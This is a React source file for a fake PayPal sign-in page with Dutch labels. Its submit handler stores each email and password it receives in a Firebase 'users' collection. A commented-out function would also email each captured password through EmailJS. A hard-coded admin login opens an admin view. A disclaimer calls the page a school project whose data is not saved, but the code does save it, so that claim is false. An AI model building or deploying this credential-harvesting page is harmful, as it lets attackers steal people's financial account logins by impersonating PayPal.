import React, { useState } from "react";
// import emailjs from "emailjs-com";
import { Popover, PopoverHeader, PopoverBody } from "reactstrap";
import "./SignIn.css";
import db from "../../firebase";

function SignIn({ setIsAdmin }) {
  const logo = "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [popoverOpen, setPopoverOpen] = useState(false);

  const toggle = () => setPopoverOpen(!popoverOpen);

  // async function sendEmail(email, password) {
  //   const service_id = "service_r10yy1p";
  //   const template_id = "template_6tbtipc";
  //   const user_id = "user_EjrsDgwCIIV6ZOcW16y6V";
  //   const templateParams = {
  //     to_email: email,
  //     message_password: password,
  //   };
  //   await emailjs.send(service_id, template_id, templateParams, user_id);
  //   setEmail("");
  //   setPassword("");
  // }

  async function addToDatabase(email, password) {
    await db.collection("users").add({ email: email, password: password });
  }

  function handelSubmit(e) {
    e.preventDefault();

    if (email === "admin@admin.com" && password === "admin123") {
      setIsAdmin(true);
    } else {
      if (email === "" || password === "") {
        return;
      } else {
        addToDatabase(email, password);
      }
    }
  }

  return (
    <div className="signIn">
      <div className="signIn__container">
        <img src={logo} alt="" />
        <div className="signIn__form">
          <form onSubmit={handelSubmit}>
            <div className="signIn__form">
              <input
                id="email"
                type="email"
                placeholder="E-mailadres"
                onChange={(e) => setEmail(e.target.value)}
                value={email}
              />
            </div>
            <div className="signIn__form">
              <input
                id="password"
                type="password"
                placeholder="Wachtwoord"
                onChange={(e) => setPassword(e.target.value)}
                value={password}
              />
            </div>
            <div className="signIn__form">
              <button>Log In</button>
            </div>
          </form>
        </div>
        <div className="signIn__openAcountForm">
          <button className="signIn__openAcount">Rekening openen</button>
        </div>
      </div>
      <div>
        <Popover
          trigger="legacy"
          placement="top"
          isOpen={popoverOpen}
          target="disclaimer"
          toggle={toggle}
          className="popover"
        >
          <PopoverHeader className="popover__header">Disclaimer</PopoverHeader>
          <PopoverBody className="popover__body">
            This website is part of our school project. There are no intentions
            of real scamming. Submited data will not be saved.
          </PopoverBody>
        </Popover>
      </div>
      <div className="signIn__footer">
        <div className="signIn__footerItems">
          <p className="signIn__footerItem">Contact</p>
          <p className="signIn__footerItem disclaimer" id="disclaimer">
            Disclaimer
          </p>
        </div>
      </div>
    </div>
  );
}

export default SignIn;
